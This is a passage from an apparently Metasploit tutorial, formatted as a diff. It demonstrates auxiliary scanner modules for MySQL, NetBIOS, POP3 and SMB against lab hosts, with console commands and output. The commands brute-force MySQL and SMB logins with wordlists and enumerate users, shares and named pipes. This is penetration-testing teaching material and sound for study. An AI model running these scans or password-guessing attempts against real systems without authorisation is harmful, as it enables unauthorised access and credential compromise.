+   STOP_ON_SUCCESS   false                               yes       Stop guessing when a credential works for a host
+   THREADS           1                                   yes       The number of concurrent threads
+   USERNAME                                              no        A specific username to authenticate as
+   USERPASS_FILE                                         no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                               no        Try the username as the password for all users
+   USER_FILE                                             no        File containing usernames, one per line
+   VERBOSE           true                                yes       Whether to print output for all attempts
+
+
+To configure our scan, we point the module to files containing usernames and passwords, set our RHOSTS value, and let it run.
+
+::
+
+  msf auxiliary(mysql_login) > set PASS_FILE /tmp/passes.txt
+ PASS_FILE => /tmp/passes.txt
+ msf auxiliary(mysql_login) > set RHOSTS 192.168.1.200
+ RHOSTS => 192.168.1.200
+ msf auxiliary(mysql_login) > set USER_FILE /tmp/users.txt
+ USER_FILE => /tmp/users.txt
+ msf auxiliary(mysql_login) > run
+
+ [*] 192.168.1.200:3306 - Found remote MySQL version 5.0.51a
+ [*] 192.168.1.200:3306 Trying username:'administrator' with password:''
+  [*] 192.168.1.200:3306 failed to login as 'administrator' with password ''
+ [*] 192.168.1.200:3306 Trying username:'admin' with password:''
+ [*] 192.168.1.200:3306 failed to login as 'admin' with password ''
+ [*] 192.168.1.200:3306 Trying username:'root' with password:''
+ [*] 192.168.1.200:3306 failed to login as 'root' with password ''
+ [*] 192.168.1.200:3306 Trying username:'god' with password:''
+ [*] 192.168.1.200:3306 failed to login as 'god' with password ''
+ [*] 192.168.1.200:3306 Trying username:'administrator' with password:'root'
+ [*] 192.168.1.200:3306 failed to login as 'administrator' with password 'root'
+ [*] 192.168.1.200:3306 Trying username:'administrator' with password:'admin'
+ [*] 192.168.1.200:3306 failed to login as 'administrator' with password 'admin'
+ [*] 192.168.1.200:3306 Trying username:'administrator' with password:'god'
+ [*] 192.168.1.200:3306 failed to login as 'administrator' with password 'god'
+ [*] 192.168.1.200:3306 Trying username:'administrator' with password:'s3cr3t'
+ [*] 192.168.1.200:3306 failed to login as 'administrator' with password 's3cr3t'
+ [*] 192.168.1.200:3306 Trying username:'admin' with password:'root'
+ [*] 192.168.1.200:3306 failed to login as 'admin' with password 'root'
+ [*] 192.168.1.200:3306 Trying username:'admin' with password:'admin'
+ [*] 192.168.1.200:3306 failed to login as 'admin' with password 'admin'
+ [*] 192.168.1.200:3306 Trying username:'admin' with password:'god'
+ [*] 192.168.1.200:3306 failed to login as 'admin' with password 'god'
+ [*] 192.168.1.200:3306 Trying username:'admin' with password:'s3cr3t'
+ [*] 192.168.1.200:3306 failed to login as 'admin' with password 's3cr3t'
+ [*] 192.168.1.200:3306 Trying username:'root' with password:'root'
+ [+] 192.168.1.200:3306 - SUCCESSFUL LOGIN 'root' : 'root'
+ [*] 192.168.1.200:3306 Trying username:'god' with password:'root'
+ [*] 192.168.1.200:3306 failed to login as 'god' with password 'root'
+ [*] 192.168.1.200:3306 Trying username:'god' with password:'admin'
+ [*] 192.168.1.200:3306 failed to login as 'god' with password 'admin'
+ [*] 192.168.1.200:3306 Trying username:'god' with password:'god'
+ [*] 192.168.1.200:3306 failed to login as 'god' with password 'god'
+ [*] 192.168.1.200:3306 Trying username:'god' with password:'s3cr3t'
+ [*] 192.168.1.200:3306 failed to login as 'god' with password 's3cr3t'
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(mysql_login) >
+
+**mysql_version**
+
+The “mysql_version” module, as its name implies, scans a host or range of hosts to determine the version of MySQL that is running.
+
+::
+
+  msf > use auxiliary/scanner/mysql/mysql_version
+ msf auxiliary(mysql_version) > show options
+
+ Module options (auxiliary/scanner/mysql/mysql_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    3306             yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+
+
+To configure the module, we simply set our RHOSTS and THREADS values and let it run.
+
+::
+
+  msf auxiliary(mysql_version) > set RHOSTS 192.168.1.200-254
+ RHOSTS => 192.168.1.200-254
+ msf auxiliary(mysql_version) > set THREADS 20
+ THREADS => 20
+ msf auxiliary(mysql_version) > run
+
+ [*] 192.168.1.200:3306 is running MySQL 5.0.51a-3ubuntu5 (protocol 10)
+ [*] 192.168.1.201:3306 is running MySQL, but responds with an error: \x04Host '192.168.1.101' is not allowed to connect to this MySQL server
+ [*] Scanned 21 of 55 hosts (038% complete)
+ [*] 192.168.1.203:3306 is running MySQL, but responds with an error: \x04Host '192.168.1.101' is not allowed to connect to this MySQL server
+ [*] Scanned 22 of 55 hosts (040% complete)
+ [*] Scanned 42 of 55 hosts (076% complete)
+ [*] Scanned 44 of 55 hosts (080% complete)
+ [*] Scanned 45 of 55 hosts (081% complete)
+ [*] Scanned 48 of 55 hosts (087% complete)
+ [*] Scanned 50 of 55 hosts (090% complete)
+ [*] Scanned 51 of 55 hosts (092% complete)
+ [*] Scanned 52 of 55 hosts (094% complete)
+ [*] Scanned 55 of 55 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(mysql_version) >
+
+
+NetBIOS
+""""""""""
+
+**nbname*
+
+The “nbname” auxiliary module scans a range of hosts and determines their hostnames via NetBIOS.
+
+::
+
+  msf > use auxiliary/scanner/netbios/nbname
+ msf auxiliary(nbname) > show options
+
+ Module options (auxiliary/scanner/netbios/nbname):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   BATCHSIZE  256              yes       The number of hosts to probe in each set
+   RHOSTS                      yes       The target address range or CIDR identifier
+   RPORT      137              yes       The target port (UDP)
+   THREADS    10               yes       The number of concurrent threads
+
+
+To configure the module, we set the RHOSTS and THREADS values then let it run.
+
+::
+
+  msf auxiliary(nbname) > set RHOSTS 192.168.1.200-210
+ RHOSTS => 192.168.1.200-210
+ msf auxiliary(nbname) > set THREADS 11
+ THREADS => 11
+ msf auxiliary(nbname) > run
+
+ [*] Sending NetBIOS status requests to 192.168.1.200->192.168.1.210 (11 hosts)
+ [*] 192.168.1.200 [METASPLOITABLE] OS:Unix Names:(METASPLOITABLE, WORKGROUP) Addresses:(192.168.1.208) Mac:00:00:00:00:00:00
+ [*] 192.168.1.201 [XEN-XP-SPLOIT] OS:Windows Names:(XEN-XP-SPLOIT, WORKGROUP) Addresses:(192.168.1.201) Mac:8a:e9:17:42:35:b0
+ [*] 192.168.1.203 [XEN-XP-FUZZBOX] OS:Windows Names:(XEN-XP-FUZZBOX, WORKGROUP) Addresses:(192.168.1.203) Mac:3e:ff:3c:4c:89:67
+ [*] 192.168.1.205 [XEN-2K3-64] OS:Windows Names:(XEN-2K3-64, WORKGROUP, __MSBROWSE__) Addresses:(192.168.1.205) Mac:3a:f1:47:f6:a3:ab
+ [*] 192.168.1.206 [XEN-2K3-EXPLOIT] OS:Windows Names:(XEN-2K3-EXPLOIT, WORKGROUP) Addresses:(192.168.1.206) Mac:12:bf:af:84:1c:35
+ [*] Scanned 11 of 11 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(nbname) >
+
+
+POP3
+""""""
+
+**pop3_version**
+
+The “pop3_version” module, as its name implies, scans a host or range of hosts for POP3 mail servers and determines the version running on them.
+
+::
+
+  msf > use auxiliary/scanner/pop3/pop3_version
+ msf auxiliary(pop3_version) > show options
+
+ Module options (auxiliary/scanner/pop3/pop3_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    110              yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+
+
+This module requires only that we set the RHOSTS and THREADS values then let it run.
+
+
+::
+
+  msf auxiliary(pop3_version) > set RHOSTS 192.168.1.200-250
+ RHOSTS => 192.168.1.200-250
+ msf auxiliary(pop3_version) > set THREADS 20
+ THREADS => 20
+ msf auxiliary(pop3_version) > run
+
+ [*] Scanned 13 of 51 hosts (025% complete)
+ [*] 192.168.1.204:110 POP3 +OK Dovecot ready.\x0d\x0a
+ [*] 192.168.1.219:110 POP3 +OK POP3\x0d\x0a
+ [*] Scanned 29 of 51 hosts (056% complete)
+ [*] Scanned 31 of 51 hosts (060% complete)
+ [*] Scanned 37 of 51 hosts (072% complete)
+ [*] Scanned 39 of 51 hosts (076% complete)
+ [*] 192.168.1.224:110 POP3 +OK localhost Cyrus POP3 v2.3.2 server ready >3017279298.1269446070@localhost>\x0d\x0a
+ [*] Scanned 51 of 51 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(pop3_version) >
+
+SMB
+""""""""""
+
+**pipe_auditor**
+
+The pipe_auditor scanner will determine what named pipes are available over SMB. In your information gathering stage, this can provide you with some insight as to some of the services that are running on the remote system.
+
+::
+
+  msf > use auxiliary/scanner/smb/pipe_auditor
+ msf auxiliary(pipe_auditor) > show options
+
+ Module options:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS                      yes       The target address range or CIDR identifier
+   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+   THREADS    1                yes       The number of concurrent threads
+
+ msf auxiliary(pipe_auditor) >
+
+
+To run the scanner, just pass, at a minimum, the RHOSTS value to the module and run it.
+
+
+::
+
+  msf auxiliary(pipe_auditor) > set RHOSTS 192.168.1.150-160
+ RHOSTS => 192.168.1.150-160
+ msf auxiliary(pipe_auditor) > set THREADS 11
+ THREADS => 11
+ msf auxiliary(pipe_auditor) > run
+
+ [*] 192.168.1.150 - Pipes: \browser
+ [*] 192.168.1.160 - Pipes: \browser
+ [*] Scanned 02 of 11 hosts (018% complete)
+ [*] Scanned 10 of 11 hosts (090% complete)
+ [*] Scanned 11 of 11 hosts (100% complete)
+ [*] Auxiliary module execution completed
+
+
+We can see that running the scanner without credentials does not return a great deal of information. If, however, you have been provided with credentials as part of a pentest, you will find that the pipe_auditor scanner returns a great deal more information.
+
+::
+
+  msf auxiliary(pipe_auditor) > set SMBPass s3cr3t
+ SMBPass => s3cr3t
+ msf auxiliary(pipe_auditor) > set SMBUser Administrator
+ SMBUser => Administrator
+ msf auxiliary(pipe_auditor) > run
+
+ [*] 192.168.1.150 - Pipes: \netlogon, \lsarpc, \samr, \browser, \atsvc, \DAV RPC SERVICE, \epmapper, \eventlog, \InitShutdown, \keysvc, \lsass, \ntsvcs, \protected_storage, \scerpc, \srvsvc, \trkwks, \wkssvc
+ [*] Scanned 02 of 11 hosts (018% complete)
+ [*] 192.168.1.160 - Pipes: \netlogon, \lsarpc, \samr, \browser, \atsvc, \DAV RPC SERVICE, \epmapper, \eventlog, \InitShutdown, \keysvc, \lsass, \ntsvcs, \protected_storage, \router, \scerpc, \srvsvc, \trkwks, \wkssvc
+ [*] Scanned 04 of 11 hosts (036% complete)
+ [*] Scanned 08 of 11 hosts (072% complete)
+ [*] Scanned 09 of 11 hosts (081% complete)
+ [*] Scanned 11 of 11 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(pipe_auditor) >
+
+
+**pipe_dcerpc_auditor**
+
+The pipe_dcerpc_auditor scanner will return the DCERPC services that can be accessed via a SMB pipe.
+
+
+::
+
+  msf > use auxiliary/scanner/smb/pipe_dcerpc_auditor
+ msf auxiliary(pipe_dcerpc_auditor) > show options
+
+ Module options:
+
+   Name       Current Setting    Required  Description
+   ----       ---------------    --------  -----------
+   RHOSTS     192.168.1.150-160  yes       The target address range or CIDR identifier
+   SMBDomain  WORKGROUP          no        The Windows domain to use for authentication
+   SMBPIPE    BROWSER            yes       The pipe name to use (BROWSER)
+   SMBPass                       no        The password for the specified username
+   SMBUser                       no        The username to authenticate as
+   THREADS    11                 yes       The number of concurrent threads
+
+ msf auxiliary(pipe_dcerpc_auditor) > set RHOSTS 192.168.1.150-160
+ RHOSTS => 192.168.1.150-160
+ msf auxiliary(pipe_dcerpc_auditor) > set THREADS 11
+ THREADS => 11
+ msf auxiliary(pipe_dcerpc_auditor) > run
+
+ The connection was refused by the remote host (192.168.1.153:139).
+ The connection was refused by the remote host (192.168.1.153:445).
+ 192.168.1.160 - UUID 00000131-0000-0000-c000-000000000046 0.0 OPEN VIA BROWSER
+ 192.168.1.150 - UUID 00000131-0000-0000-c000-000000000046 0.0 OPEN VIA BROWSER
+ 192.168.1.160 - UUID 00000134-0000-0000-c000-000000000046 0.0 OPEN VIA BROWSER
+ 192.168.1.150 - UUID 00000134-0000-0000-c000-000000000046 0.0 OPEN VIA BROWSER
+ 192.168.1.150 - UUID 00000143-0000-0000-c000-000000000046 0.0 OPEN VIA BROWSER
+ 192.168.1.160 - UUID 00000143-0000-0000-c000-000000000046 0.0 OPEN VIA BROWSER
+ ...snip...
+
+
+**smb2**
+
+The SMB2 scanner module simply scans the remote hosts and determines if they support the SMB2 protocol.
+
+::
+
+  msf > use auxiliary/scanner/smb/smb2
+ msf auxiliary(smb2) > show options
+
+ Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    445              yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+
+ msf auxiliary(smb2) > set RHOSTS 192.168.1.150-165
+ RHOSTS => 192.168.1.150-165
+ msf auxiliary(smb2) > set THREADS 16
+ THREADS => 16
+ msf auxiliary(smb2) > run
+
+ [*] 192.168.1.162 supports SMB 2 [dialect 255.2] and has been online for 618 hours
+ [*] Scanned 06 of 16 hosts (037% complete)
+ [*] Scanned 13 of 16 hosts (081% complete)
+ [*] Scanned 14 of 16 hosts (087% complete)
+ [*] Scanned 16 of 16 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(smb2) >
+
+
+**smb_enumshares**
+
+The smb_enumshares module, as would be expected, enumerates any SMB shares that are available on a remote system.
+
+::
+
+  msf > use auxiliary/scanner/smb/smb_enumshares
+ msf auxiliary(smb_enumshares) > show options
+
+ Module options (auxiliary/scanner/smb/smb_enumshares):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   LogSpider        3                no        0 = disabled, 1 = CSV, 2 = table (txt), 3 = one liner (txt) (Accepted: 0, 1, 2, 3)
+   MaxDepth         999              yes       Max number of subdirectories to spider
+   RHOSTS                            yes       The target address range or CIDR identifier
+   SMBDomain        .                no        The Windows domain to use for authentication
+   SMBPass                           no        The password for the specified username
+   SMBUser                           no        The username to authenticate as
+   ShowFiles        false            yes       Show detailed information when spidering
+   SpiderProfiles   true             no        Spider only user profiles when share = C$
+   SpiderShares     false            no        Spider shares recursively
+   THREADS          1                yes       The number of concurrent threads
+   USE_SRVSVC_ONLY  false            yes       List shares only with SRVSVC
+
+ msf auxiliary(smb_enumshares) > set RHOSTS 192.168.1.150-165
+ RHOSTS => 192.168.1.150-165
+ msf auxiliary(smb_enumshares) > set THREADS 16
+ THREADS => 16
+ msf auxiliary(smb_enumshares) > run
+
+ [*] 192.168.1.154:139 print$ - Printer Drivers (DISK), tmp - oh noes! (DISK), opt -  (DISK), IPC$ - IPC Service (metasploitable server (Samba 3.0.20-Debian)) (IPC), ADMIN$ - IPC Service (metasploitable server (Samba 3.0.20-Debian)) (IPC)
+ Error: 192.168.1.160 Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_ACCESS_DENIED (Command=37 WordCount=0)
+ Error: 192.168.1.160 Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_ACCESS_DENIED (Command=37 WordCount=0)
+ [*] 192.168.1.161:139 IPC$ - Remote IPC (IPC), ADMIN$ - Remote Admin (DISK), C$ - Default share (DISK)
+ Error: 192.168.1.162 Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_ACCESS_DENIED (Command=37 WordCount=0)
+ Error: 192.168.1.150 Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_ACCESS_DENIED (Command=37 WordCount=0)
+ Error: 192.168.1.150 Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_ACCESS_DENIED (Command=37 WordCount=0)
+ [*] Scanned 06 of 16 hosts (037% complete)
+ [*] Scanned 09 of 16 hosts (056% complete)
+ [*] Scanned 10 of 16 hosts (062% complete)
+ [*] Scanned 14 of 16 hosts (087% complete)
+ [*] Scanned 15 of 16 hosts (093% complete)
+ [*] Scanned 16 of 16 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(smb_enumshares) >
+
+
+As you can see, since this is an un-credentialed scan, access is denied a most of the systems that are probed. Passing user credentials to the scanner will produce much different results.
+
+::
+
+  msf auxiliary(smb_enumshares) > set SMBPass s3cr3t
+ SMBPass => s3cr3t
+ msf auxiliary(smb_enumshares) > set SMBUser Administrator
+ SMBUser => Administrator
+ msf auxiliary(smb_enumshares) > run
+
+ [*] 192.168.1.161:139 IPC$ - Remote IPC (IPC), ADMIN$ - Remote Admin (DISK), C$ - Default share (DISK)
+ [*] 192.168.1.160:139 IPC$ - Remote IPC (IPC), ADMIN$ - Remote Admin (DISK), C$ - Default share (DISK)
+ [*] 192.168.1.150:139 IPC$ - Remote IPC (IPC), ADMIN$ - Remote Admin (DISK), C$ - Default share (DISK)
+ [*] Scanned 06 of 16 hosts (037% complete)
+ [*] Scanned 07 of 16 hosts (043% complete)
+ [*] Scanned 12 of 16 hosts (075% complete)
+ [*] Scanned 15 of 16 hosts (093% complete)
+ [*] Scanned 16 of 16 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(smb_enumshares) >
+
+
+**smb_enumusers**
+
+The smb_enumusers scanner will connect to each system via the SMB RPC service and enumerate the users on the system.
+
+
+::
+
+  msf > use auxiliary/scanner/smb/smb_enumusers
+ msf auxiliary(smb_enumusers) > show options
+
+ Module options:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS                      yes       The target address range or CIDR identifier
+   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+   THREADS    1                yes       The number of concurrent threads
+
+ msf auxiliary(smb_enumusers) > set RHOSTS 192.168.1.150-165
+ RHOSTS => 192.168.1.150-165
+ msf auxiliary(smb_enumusers) > set THREADS 16
+ THREADS => 16
+ msf auxiliary(smb_enumusers) > run
+
+ [*] 192.168.1.161 XEN-XP-SP2-BARE [  ]
+ [*] 192.168.1.154 METASPLOITABLE [ games, nobody, bind, proxy, syslog, user, www-data, root, news, postgres, bin, mail, distccd, proftpd, dhcp, daemon, sshd, man, lp, mysql, gnats, libuuid, backup, msfadmin, telnetd, sys, klog, postfix, service, list, irc, ftp, tomcat55, sync, uucp ] ( LockoutTries=0 PasswordMin=5 )
+ [*] Scanned 05 of 16 hosts (031% complete)
+ [*] Scanned 12 of 16 hosts (075% complete)
+ [*] Scanned 15 of 16 hosts (093% complete)
+ [*] Scanned 16 of 16 hosts (100% complete)
+ [*] Auxiliary module execution completed
+
+
+We can see that running the scan without credentials, only the Linux Samba service coughs up a listing of users. Passing a valid set of credentials to the scanner will enumerate the users on our other targets.
+
+::
+
+  msf auxiliary(smb_enumusers) > set SMBPass s3cr3t
+ SMBPass => s3cr3t
+ msf auxiliary(smb_enumusers) > set SMBUser Administrator
+ SMBUser => Administrator
+ msf auxiliary(smb_enumusers) > run
+
+ [*] 192.168.1.150 V-XPSP2-SPLOIT- [ Administrator, Guest, HelpAssistant, SUPPORT_388945a0 ]
+ [*] Scanned 04 of 16 hosts (025% complete)
+ [*] 192.168.1.161 XEN-XP-SP2-BARE [ Administrator, Guest, HelpAssistant, SUPPORT_388945a0, victim ]
+ [*] 192.168.1.160 XEN-XP-PATCHED [ Administrator, ASPNET, Guest, HelpAssistant, SUPPORT_388945a0 ]
+ [*] Scanned 09 of 16 hosts (056% complete)
+ [*] Scanned 13 of 16 hosts (081% complete)
+ [*] Scanned 15 of 16 hosts (093% complete)
+ [*] Scanned 16 of 16 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(smb_enumusers) >
+
+
+Now that we have passed credentials to the scanner, the Linux box doesn’t return the set of users because the credentials are not valid for that system. This is an example of why it pays to run a scanner in different configurations.
+
+**smb_login**
+
+Metasploit’s smb_login module will attempt to login via SMB across a provided range of IP addresses. If you have a database plugin loaded, successful logins will be stored in it for future reference and usage.
+
+::
+
+  msf > use auxiliary/scanner/smb/smb_login
+ msf auxiliary(smb_login) > show options
+
+ Module options (auxiliary/scanner/smb/smb_login):
+
+   Name              Current Setting                     Required  Description
+   ----              ---------------                     --------  -----------
+   ABORT_ON_LOCKOUT  false                               yes       Abort the run when an account lockout is detected
+   BLANK_PASSWORDS   false                               no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                   yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                               no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                               no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                               no        Add all users in the current database to the list
+   DETECT_ANY_AUTH   true                                no        Enable detection of systems accepting any authentication
+   PASS_FILE         /usr/share/wordlists/fasttrack.txt  no        File containing passwords, one per line
+   PRESERVE_DOMAINS  true                                no        Respect a username that contains a domain name.
+   Proxies                                               no        A proxy chain of format type:host:port[,type:host:port][...]
+   RECORD_GUEST      false                               no        Record guest-privileged random logins to the database
+   RHOSTS                                                yes       The target address range or CIDR identifier
+   RPORT             445                                 yes       The SMB service port (TCP)
+   SMBDomain         .                                   no        The Windows domain to use for authentication
+   SMBPass                                               no        The password for the specified username
+   SMBUser                                               no        The username to authenticate as
+   STOP_ON_SUCCESS   false                               yes       Stop guessing when a credential works for a host
+   THREADS           1                                   yes       The number of concurrent threads
+   USERPASS_FILE                                         no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                               no        Try the username as the password for all users
+   USER_FILE                                             no        File containing usernames, one per line
+   VERBOSE           true                                yes       Whether to print output for all attempts
+
+
+You can clearly see that this module has many more options that other auxiliary modules and is quite versatile. We will first run a scan using the Administrator credentials we ‘found’.
+
+::
+
+  msf auxiliary(smb_login) > set RHOSTS 192.168.1.150-165
+ RHOSTS => 192.168.1.150-165
+ msf auxiliary(smb_login) > set SMBPass s3cr3t
+ SMBPass => s3cr3t
+ msf auxiliary(smb_login) > set SMBUser Administrator
+ SMBUser => Administrator
+ msf auxiliary(smb_login) > set THREADS 16
+ THREADS => 16
+ msf auxiliary(smb_login) > run
+
+ [*] Starting SMB login attempt on 192.168.1.165
+ [*] Starting SMB login attempt on 192.168.1.153
+ ...snip...
+ [*] Starting SMB login attempt on 192.168.1.156
+ [*] 192.168.1.154 - FAILED LOGIN () Administrator :  (STATUS_LOGON_FAILURE)
+ [*] 192.168.1.150 - FAILED LOGIN (Windows 5.1) Administrator :  (STATUS_LOGON_FAILURE)
+ [*] 192.168.1.160 - FAILED LOGIN (Windows 5.1) Administrator :  (STATUS_LOGON_FAILURE)
+ [*] 192.168.1.154 - FAILED LOGIN () Administrator : s3cr3t (STATUS_LOGON_FAILURE)
+ [-] 192.168.1.162 - FAILED LOGIN (Windows 7 Enterprise 7600) Administrator :  (STATUS_ACCOUNT_DISABLED)
+ [*] 192.168.1.161 - FAILED LOGIN (Windows 5.1) Administrator :  (STATUS_LOGON_FAILURE)
+ [+] 192.168.1.150 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'
+ [*] Scanned 04 of 16 hosts (025% complete)
+ [+] 192.168.1.160 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'
+ [+] 192.168.1.161 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'
+ [*] Scanned 13 of 16 hosts (081% complete)
+ [*] Scanned 14 of 16 hosts (087% complete)
+ [*] Scanned 15 of 16 hosts (093% complete)
+ [*] Scanned 16 of 16 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(smb_login) >
+
+
+The smb_login module can also be passed a username and password list in order to attempt to brute-force login attempts across a range of machines.
+
+::
+
+  root@kali:~# cat users.txt
+ Administrator
+ dale
+ chip
+ dookie
+ victim
+ jimmie
+
+ root@kali:~# cat passwords.txt
+ password
+ god
+ password123
+ s00pers3kr1t
+ s3cr3t
+
+
+We will use this limited set of usernames and passwords and run the scan again.
+
+::
+
+  msf auxiliary(smb_login) > show options
+
+ Module options:
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   true             yes       Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   PASS_FILE                          no        File containing passwords, one per line
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             445              yes       Set the SMB service port
+   SMBDomain         WORKGROUP        no        SMB Domain
+   SMBPass                            no        SMB Password
+   SMBUser                            no        SMB Username
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output for all attempts
+
+ msf auxiliary(smb_login) > set PASS_FILE /root/passwords.txt
+ PASS_FILE => /root/passwords.txt
+ msf auxiliary(smb_login) > set USER_FILE /root/users.txt
+ USER_FILE => /root/users.txt
+ msf auxiliary(smb_login) > set RHOSTS 192.168.1.150-165
+ RHOSTS => 192.168.1.150-165
+ msf auxiliary(smb_login) > set THREADS 16
+ THREADS => 16
+ msf auxiliary(smb_login) > set VERBOSE false
+ VERBOSE => false
+ msf auxiliary(smb_login) > run
+
+ [-] 192.168.1.162 - FAILED LOGIN (Windows 7 Enterprise 7600) Administrator :  (STATUS_ACCOUNT_DISABLED)
+ [*] 192.168.1.161 - GUEST LOGIN (Windows 5.1) dale :
+ [*] 192.168.1.161 - GUEST LOGIN (Windows 5.1) chip :
+ [*] 192.168.1.161 - GUEST LOGIN (Windows 5.1) dookie :
+ [*] 192.168.1.161 - GUEST LOGIN (Windows 5.1) jimmie :
+ [+] 192.168.1.150 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'
+ [+] 192.168.1.160 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'
+ [+] 192.168.1.161 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'
+ [+] 192.168.1.161 - SUCCESSFUL LOGIN (Windows 5.1) 'victim' : 's3cr3t'
+ [+] 192.168.1.162 - SUCCESSFUL LOGIN (Windows 7 Enterprise 7600) 'victim' : 's3cr3t'
+ [*] Scanned 15 of 16 hosts (093% complete)
+ [*] Scanned 16 of 16 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(smb_login) >
+
+
+There are many more options available that you should experiment with to fully familiarize yourself with this extremely valuable module.
+
+
+**smb_lookupsid**
+
+
+The smb_lookupsid module brute-forces SID lookups on a range of targets to determine what local users exist the system. Knowing what users exist on a system can greatly speed up any further brute-force logon attempts later on.
+
+::
+
+  msf > use auxiliary/scanner/smb/smb_lookupsid
+ msf auxiliary(smb_lookupsid) > show options
+
+ Module options (auxiliary/scanner/smb/smb_lookupsid):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   MaxRID     4000             no        Maximum RID to check
+   RHOSTS                      yes       The target address range or CIDR identifier
+   SMBDomain  .                no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+   THREADS    1                yes       The number of concurrent threads
+
+
+ Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   LOCAL  Enumerate local accounts
+
+ msf auxiliary(smb_lookupsid) > set RHOSTS 192.168.1.150-165
+ RHOSTS => 192.168.1.150-165
+ msf auxiliary(smb_lookupsid) > set THREADS 16
+ THREADS => 16
+ msf auxiliary(smb_lookupsid) > run
+
+ [*] 192.168.1.161 PIPE(LSARPC) LOCAL(XEN-XP-SP2-BARE - 5-21-583907252-1801674531-839522115) DOMAIN(HOTZONE - )
+ [*] 192.168.1.154 PIPE(LSARPC) LOCAL(METASPLOITABLE - 5-21-1042354039-2475377354-766472396) DOMAIN(WORKGROUP - )
+ [*] 192.168.1.161 USER=Administrator RID=500
+ [*] 192.168.1.154 USER=Administrator RID=500
+ [*] 192.168.1.161 USER=Guest RID=501
+ [*] 192.168.1.154 USER=nobody RID=501
+ [*] Scanned 04 of 16 hosts (025% complete)
+ [*] 192.168.1.154 GROUP=Domain Admins RID=512
+ [*] 192.168.1.161 GROUP=None RID=513
+ [*] 192.168.1.154 GROUP=Domain Users RID=513
+ [*] 192.168.1.154 GROUP=Domain Guests RID=514
+ [*] Scanned 07 of 16 hosts (043% complete)
+ [*] 192.168.1.154 USER=root RID=1000
+ ...snip...
+ [*] 192.168.1.154 GROUP=service RID=3005
+ [*] 192.168.1.154 METASPLOITABLE [Administrator, nobody, root, daemon, bin, sys, sync, games, man, lp, mail, news, uucp, proxy, www-data, backup, list, irc, gnats, libuuid, dhcp, syslog, klog, sshd, bind, postfix, ftp, postgres, mysql, tomcat55, distccd, telnetd, proftpd, msfadmin, user, service ]
+ [*] Scanned 15 of 16 hosts (093% complete)
+ [*] 192.168.1.161 XEN-XP-SP2-BARE [Administrator, Guest, HelpAssistant, SUPPORT_388945a0, victim ]
+ [*] Scanned 16 of 16 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(smb_lookupsid) >
+
+
+
+By way of comparison, we will also run the scan using a known set of user credentials to see the difference in output.
+
+
+
+::
+
+  msf auxiliary(smb_lookupsid) > set SMBPass s3cr3t
+ SMBPass => s3cr3t
+ msf auxiliary(smb_lookupsid) > set SMBUser Administrator
+ SMBUser => Administrator
+ msf auxiliary(smb_lookupsid) > run
+
